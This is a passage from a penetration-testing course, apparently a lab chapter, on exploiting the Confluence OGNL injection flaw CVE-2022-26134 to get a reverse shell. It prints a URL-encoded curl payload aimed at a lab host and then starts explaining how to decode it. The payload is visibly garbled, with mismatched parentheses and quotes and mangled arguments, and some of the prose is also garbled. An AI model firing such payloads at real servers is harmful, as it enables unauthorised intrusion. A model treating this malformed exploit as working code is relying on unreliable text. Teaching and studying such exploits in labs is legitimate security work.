# 18.2.2 Setting Up The Lab Environment

To gain access to CONFLUENCED1, we need to leverage the command execution vulnerability in the Confluence web application to get a reverse shell. After discovering that the Confluence web application is vulnerable to CVE-2022-26134, we find a blog post from Rapid^891 that includes a cURL^892 command containing a proof-of-concept^893 payload claims to exploit the vulnerability and return a reverse shell.

```
curl \
http://10.0.0.28:8090/?%28New%29javascript.ScriptEngineManager%28%29.getRuntimeByName%28%22nashorn%22%29).exec(%22%27java.lang.ProcessBuilder%28%29.command(%22%27%2C%27%27bash%2Cn%27%2Fdev%2Ftmp%2Fexploit%2C%27%27%28start%28%29%27%28%29%22%29%22%29%7D
```

Listing 518 - The example payload from Rapid^891 blog post.

We don't run payloads without understanding exactly what they do, so we first need to figure out what's happening in this proof-of-concept.

The verbose (-v) curl request is being made to http://10.0.0.28:8090, which we assume is the blogauthor's vulnerable Confluence server. We observe that many of the characters in it are URL_encoded^895 so we need to decode them to get a clearer sense of what the payload actually does.

You can quickly decode strings using Decoding As... > URL in the Decoder tab, or using an online tool like CyberChef^897. If working with sensitive information in a real corporate environment, you should avoid pasting data into online tools. However, in this case we're decoding a proof-of-concept that is publicly aware, so we can use online tools if necessary.
